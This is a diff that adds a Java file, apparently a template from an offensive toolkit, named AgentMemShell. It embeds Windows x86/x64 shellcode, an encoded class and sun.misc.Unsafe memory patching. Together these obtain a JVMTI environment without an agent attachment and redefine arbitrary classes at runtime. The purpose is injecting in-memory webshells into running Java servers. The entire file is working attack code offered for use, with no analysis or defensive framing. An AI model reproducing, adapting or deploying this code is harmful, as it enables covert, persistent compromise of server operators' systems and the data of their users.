@@ -1,0 +1,122 @@
+import sun.misc.Unsafe;
+import java.io.IOException;
+import java.lang.instrument.ClassDefinition;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.Base64;
+
+public class AgentMemShell extends ClassLoader {
+    public Class get(byte[] b) {
+        return super.defineClass(b, 0, b.length);
+    }
+    public static int pointerLength={{var3}};
+    static {
+        try {
+            AgentForWindows("{{var1}}", Base64.getDecoder().decode("{{var2}}"));
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    static native void enqueue(long hProcess, byte[] stub,
+                               String cmd, String pipename, Object... args) throws IOException;
+
+    public static void AgentForWindows (String className,byte[] classBody) throws Exception {
+        String classStr = "yv66vgAAADQALwoABwAeCAAfCgAgACEF//////////8IACIHACMKAAsAJAcAJQoACQAmBwAnAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAB2VucXVldWUBAD0oSltCTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylWAQAKRXhjZXB0aW9ucwcAKAEAC29wZW5Qcm9jZXNzAQAEKEkpSgEAA3J1bgEABShbQilWAQANU3RhY2tNYXBUYWJsZQcAJQcAKQcAKgEAClNvdXJjZUZpbGUBABdWaXJ0dWFsTWFjaGluZUltcGwuamF2YQwADAANAQAGYXR0YWNoBwArDAAsAC0BAAR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAwAEAARAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwALgANAQAjc3VuL3Rvb2xzL2F0dGFjaC9WaXJ0dWFsTWFjaGluZUltcGwBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQATamF2YS9sYW5nL1Rocm93YWJsZQEAAltCAQAQamF2YS9sYW5nL1N5c3RlbQEAC2xvYWRMaWJyYXJ5AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAPcHJpbnRTdGFja1RyYWNlACEACwAHAAAAAAAEAAEADAANAAEADgAAAB0AAQABAAAABSq3AAGxAAAAAQAPAAAABgABAAAABQGIABAAEQABABIAAAAEAAEAEwEIABQAFQABABIAAAAEAAEAEwAJABYAFwABAA4AAAC/AAYABAAAADoSArgAAxQABCoSBhIGA70AB7gACKcAJUwrtgAKpwAdTRQABCoSBhIGA70AB7gACKcACE4ttgAKLL+xAAMABQAUABcACQAAAAUAHwAAACAALwAyAAkAAgAPAAAANgANAAAACwAFAA4AFAARABcADwAYABAAHAASAB8ADQAgAA4ALwARADIADwAzABAANwASADkAEwAYAAAAHwAFVwcAGUcHABr/ABIAAwcAGwAHABoAAQcAGQT5AAEAAQAcAAAAAgAd";
+        Class result = new AgentMemShell().get(Base64.getDecoder().decode(classStr));
+
+        Unsafe unsafe = null;
+        try {
+            Field field = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
+            field.setAccessible(true);
+            unsafe = (sun.misc.Unsafe) field.get(null);
+        } catch (Exception e) {
+            throw new AssertionError(e);
+        }
+
+        long JPLISAgent = unsafe.allocateMemory(0x1000);
+
+        byte[] buf=new byte[]{(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x28,(byte)0x48,(byte)0x83,(byte)0xE4,(byte)0xF0,(byte)0x48,(byte)0x31,(byte)0xC9,(byte)0x65,(byte)0x48,(byte)0x8B,(byte)0x41,(byte)0x60,(byte)0x48,(byte)0x8B,(byte)0x40,(byte)0x18,(byte)0x48,(byte)0x8B,(byte)0x70,(byte)0x20,(byte)0x48,(byte)0xAD,(byte)0x48,(byte)0x96,(byte)0x48,(byte)0xAD,(byte)0x48,(byte)0x8B,(byte)0x58,(byte)0x20,(byte)0x4D,(byte)0x31,(byte)0xC0,(byte)0x44,(byte)0x8B,(byte)0x43,(byte)0x3C,(byte)0x4C,(byte)0x89,(byte)0xC2,(byte)0x48,(byte)0x01,(byte)0xDA,(byte)0x44,(byte)0x8B,(byte)0x82,(byte)0x88,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x49,(byte)0x01,(byte)0xD8,(byte)0x48,(byte)0x31,(byte)0xF6,(byte)0x41,(byte)0x8B,(byte)0x70,(byte)0x20,(byte)0x48,(byte)0x01,(byte)0xDE,(byte)0x48,(byte)0x31,(byte)0xC9,(byte)0x49,(byte)0xB9,(byte)0x47,(byte)0x65,(byte)0x74,(byte)0x50,(byte)0x72,(byte)0x6F,(byte)0x63,(byte)0x41,(byte)0x48,(byte)0xFF,(byte)0xC1,(byte)0x48,(byte)0x31,(byte)0xC0,(byte)0x8B,(byte)0x04,(byte)0x8E,(byte)0x48,(byte)0x01,(byte)0xD8,(byte)0x4C,(byte)0x39,(byte)0x08,(byte)0x75,(byte)0xEF,(byte)0x48,(byte)0x31,(byte)0xF6,(byte)0x41,(byte)0x8B,(byte)0x70,(byte)0x24,(byte)0x48,(byte)0x01,(byte)0xDE,(byte)0x66,(byte)0x8B,(byte)0x0C,(byte)0x4E,(byte)0x48,(byte)0x31,(byte)0xF6,(byte)0x41,(byte)0x8B,(byte)0x70,(byte)0x1C,(byte)0x48,(byte)0x01,(byte)0xDE,(byte)0x48,(byte)0x31,(byte)0xD2,(byte)0x8B,(byte)0x14,(byte)0x8E,(byte)0x48,(byte)0x01,(byte)0xDA,(byte)0x48,(byte)0x89,(byte)0xD7,(byte)0xB9,(byte)0x61,(byte)0x72,(byte)0x79,(byte)0x41,(byte)0x51,(byte)0x48,(byte)0xB9,(byte)0x4C,(byte)0x6F,(byte)0x61,(byte)0x64,(byte)0x4C,(byte)0x69,(byte)0x62,(byte)0x72,(byte)0x51,(byte)0x48,(byte)0x89,(byte)0xE2,(byte)0x48,(byte)0x89,(byte)0xD9,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x30,(byte)0xFF,(byte)0xD7,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x30,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x10,(byte)0x48,(byte)0x89,(byte)0xC6,(byte)0xB9,(byte)0x6C,(byte)0x6C,(byte)0x00,(byte)0x00,(byte)0x51,(byte)0xB9,(byte)0x6A,(byte)0x76,(byte)0x6D,(byte)0x00,(byte)0x51,(byte)0x48,(byte)0x89,(byte)0xE1,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x30,(byte)0xFF,(byte)0xD6,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x30,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x10,(byte)0x49,(byte)0x89,(byte)0xC7,(byte)0x48,(byte)0x31,(byte)0xC9,(byte)0x48,(byte)0xB9,(byte)0x76,(byte)0x61,(byte)0x56,(byte)0x4D,(byte)0x73,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x51,(byte)0x48,(byte)0xB9,(byte)0x72,(byte)0x65,(byte)0x61,(byte)0x74,(byte)0x65,(byte)0x64,(byte)0x4A,(byte)0x61,(byte)0x51,(byte)0x48,(byte)0xB9,(byte)0x4A,(byte)0x4E,(byte)0x49,(byte)0x5F,(byte)0x47,(byte)0x65,(byte)0x74,(byte)0x43,(byte)0x51,(byte)0x48,(byte)0x89,(byte)0xE2,(byte)0x4C,(byte)0x89,(byte)0xF9,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x28,(byte)0xFF,(byte)0xD7,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x28,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x18,(byte)0x49,(byte)0x89,(byte)0xC7,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x28,(byte)0x48,(byte)0x89,(byte)0xE1,(byte)0xBA,(byte)0x01,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x49,(byte)0x89,(byte)0xC8,(byte)0x49,(byte)0x83,(byte)0xC0,(byte)0x08,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x28,(byte)0x41,(byte)0xFF,(byte)0xD7,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x28,(byte)0x48,(byte)0x8B,(byte)0x09,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x20,(byte)0x54,(byte)0x48,(byte)0x89,(byte)0xE2,(byte)0x4D,(byte)0x31,(byte)0xC0,(byte)0x4C,(byte)0x8B,(byte)0x39,(byte)0x4D,(byte)0x8B,(byte)0x7F,(byte)0x20,(byte)0x49,(byte)0x89,(byte)0xCE,(byte)0x41,(byte)0xFF,(byte)0xD7,(byte)0x4C,(byte)0x89,(byte)0xF1,(byte)0x48,(byte)0xBA,(byte)0x48,(byte)0x47,(byte)0x46,(byte)0x45,(byte)0x44,(byte)0x43,(byte)0x42,(byte)0x41,(byte)0x41,(byte)0xB8,(byte)0x00,(byte)0x02,(byte)0x01,(byte)0x30,(byte)0x4D,(byte)0x8B,(byte)0x3E,(byte)0x4D,(byte)0x8B,(byte)0x7F,(byte)0x30,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x20,(byte)0x41,(byte)0xFF,(byte)0xD7,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x20,(byte)0x4C,(byte)0x89,(byte)0xF1,(byte)0x4D,(byte)0x8B,(byte)0x3E,(byte)0x4D,(byte)0x8B,(byte)0x7F,(byte)0x28,(byte)0x41,(byte)0xFF,(byte)0xD7,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x78,(byte)0xC3};
+        byte[] stub=new byte[]{0x48,0x47,0x46,0x45,0x44,0x43,0x42,0x41};
+        if (pointerLength==4) {
+            buf = new byte[]{(byte) 0x90, (byte) 0x90, (byte) 0x90, (byte) 0x33, (byte) 0xC9, (byte) 0x64, (byte) 0xA1, (byte) 0x30, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x8B, (byte) 0x40, (byte) 0x0C, (byte) 0x8B, (byte) 0x70, (byte) 0x14, (byte) 0xAD, (byte) 0x96, (byte) 0xAD, (byte) 0x8B, (byte) 0x58, (byte) 0x10, (byte) 0x8B, (byte) 0x53, (byte) 0x3C, (byte) 0x03, (byte) 0xD3, (byte) 0x8B, (byte) 0x52, (byte) 0x78, (byte) 0x03, (byte) 0xD3, (byte) 0x33, (byte) 0xC9, (byte) 0x8B, (byte) 0x72, (byte) 0x20, (byte) 0x03, (byte) 0xF3, (byte) 0x41, (byte) 0xAD, (byte) 0x03, (byte) 0xC3, (byte) 0x81, (byte) 0x38, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x50, (byte) 0x75, (byte) 0xF4, (byte) 0x81, (byte) 0x78, (byte) 0x04, (byte) 0x72, (byte) 0x6F, (byte) 0x63, (byte) 0x41, (byte) 0x75, (byte) 0xEB, (byte) 0x81, (byte) 0x78, (byte) 0x08, (byte) 0x64, (byte) 0x64, (byte) 0x72, (byte) 0x65, (byte) 0x75, (byte) 0xE2, (byte) 0x8B, (byte) 0x72, (byte) 0x24, (byte) 0x03, (byte) 0xF3, (byte) 0x66, (byte) 0x8B, (byte) 0x0C, (byte) 0x4E, (byte) 0x49, (byte) 0x8B, (byte) 0x72, (byte) 0x1C, (byte) 0x03, (byte) 0xF3, (byte) 0x8B, (byte) 0x14, (byte) 0x8E, (byte) 0x03, (byte) 0xD3, (byte) 0x52, (byte) 0x33, (byte) 0xC9, (byte) 0x51, (byte) 0x68, (byte) 0x61, (byte) 0x72, (byte) 0x79, (byte) 0x41, (byte) 0x68, (byte) 0x4C, (byte) 0x69, (byte) 0x62, (byte) 0x72, (byte) 0x68, (byte) 0x4C, (byte) 0x6F, (byte) 0x61, (byte) 0x64, (byte) 0x54, (byte) 0x53, (byte) 0xFF, (byte) 0xD2, (byte) 0x83, (byte) 0xC4, (byte) 0x0C, (byte) 0x59, (byte) 0x50, (byte) 0x66, (byte) 0xB9, (byte) 0x33, (byte) 0x32, (byte) 0x51, (byte) 0x68, (byte) 0x6A, (byte) 0x76, (byte) 0x6D, (byte) 0x00, (byte) 0x54, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0xD8, (byte) 0x83, (byte) 0xC4, (byte) 0x0C, (byte) 0x5A, (byte) 0x33, (byte) 0xC9, (byte) 0x51, (byte) 0x6A, (byte) 0x73, (byte) 0x68, (byte) 0x76, (byte) 0x61, (byte) 0x56, (byte) 0x4D, (byte) 0x68, (byte) 0x65, (byte) 0x64, (byte) 0x4A, (byte) 0x61, (byte) 0x68, (byte) 0x72, (byte) 0x65, (byte) 0x61, (byte) 0x74, (byte) 0x68, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x43, (byte) 0x68, (byte) 0x4A, (byte) 0x4E, (byte) 0x49, (byte) 0x5F, (byte) 0x54, (byte) 0x53, (byte) 0xFF, (byte) 0xD2, (byte) 0x89, (byte) 0x45, (byte) 0xF0, (byte) 0x54, (byte) 0x6A, (byte) 0x01, (byte) 0x54, (byte) 0x59, (byte) 0x83, (byte) 0xC1, (byte) 0x10, (byte) 0x51, (byte) 0x54, (byte) 0x59, (byte) 0x6A, (byte) 0x01, (byte) 0x51, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0xC1, (byte) 0x83, (byte) 0xEC, (byte) 0x30, (byte) 0x6A, (byte) 0x00, (byte) 0x54, (byte) 0x59, (byte) 0x83, (byte) 0xC1, (byte) 0x10, (byte) 0x51, (byte) 0x8B, (byte) 0x00, (byte) 0x50, (byte) 0x8B, (byte) 0x18, (byte) 0x8B, (byte) 0x43, (byte) 0x10, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0x43, (byte) 0x18, (byte) 0x68, (byte) 0x00, (byte) 0x02, (byte) 0x01, (byte) 0x30, (byte) 0x68, (byte) 0x44, (byte) 0x43, (byte) 0x42, (byte) 0x41, (byte) 0x83, (byte) 0xEC, (byte) 0x04, (byte) 0xFF, (byte) 0xD0, (byte) 0x83, (byte) 0xEC, (byte) 0x0C, (byte) 0x8B, (byte) 0x43, (byte) 0x14, (byte) 0xFF, (byte) 0xD0, (byte) 0x83, (byte) 0xC4, (byte) 0x5C, (byte) 0xC3};
+            stub=new byte[]{0x44,0x43,0x42,0x41};
+        }
+        buf = replaceBytes(buf,stub,long2ByteArray_Little_Endian(JPLISAgent+pointerLength,pointerLength));
+
+        classBody[7]=0x32;
+        try {
+            for (Method m:result.getDeclaredMethods())
+            {
+                if (m.getName().equals("run"))
+                {
+                    m.invoke(result, buf);
+                }
+            }
+        }
+        finally {
+            long native_jvmtienv = unsafe.getLong(JPLISAgent + pointerLength);
+            if (pointerLength == 4) {
+                unsafe.putByte(native_jvmtienv + 201, (byte) 2);
+                unsafe.putByte(native_jvmtienv + 205, (byte) 2);
+                unsafe.putByte(native_jvmtienv + 209, (byte) 2);
+            } else {
+                unsafe.putByte(native_jvmtienv + 377, (byte) 2);
+                unsafe.putByte(native_jvmtienv + 361, (byte) 2);
+                unsafe.putByte(native_jvmtienv + 369, (byte) 2);
+            }
+            try {
+                Class<?> instrument_clazz = Class.forName("sun.instrument.InstrumentationImpl");
+                Constructor<?> constructor = instrument_clazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
+                constructor.setAccessible(true);
+                Object inst = constructor.newInstance(JPLISAgent, true, false);
+
+                ClassDefinition definition = new ClassDefinition(Class.forName(className), classBody);
+                Method redefineClazz = instrument_clazz.getMethod("redefineClasses", ClassDefinition[].class);
+                redefineClazz.invoke(inst, new Object[]{
+                        new ClassDefinition[]{
+                                definition
+                        }
+                });
+            } catch (Throwable error) {
+                error.printStackTrace();
+                throw error;
+            }
+        }
+    }
+
+    public static byte[] long2ByteArray_Little_Endian(long l,int length) {
+
+        byte[] array = new byte[length];
+
+        for (int i = 0; i < array.length; i++) {
+            array[i] = (byte) (l >> (i * 8));
+        }
+        return array;
+    }
+
+
+    private static byte[] replaceBytes(byte[] bytes,byte[] byteSource,byte[] byteTarget)
+    {
+        for(int i=0;i<bytes.length;i++)
+        {
+            boolean bl=true;
+            for(int j=0;j<byteSource.length;j++)
+            {
+                if(i+j<bytes.length&&bytes[i+j]==byteSource[j])
+                {
+                }
+                else
+                {
+                    bl=false;
+                }
+            }
+            if(bl)
+            {
+                System.arraycopy(byteTarget, 0, bytes, i, byteTarget.length);
+            }
+        }
+        return bytes;
+    }
+}
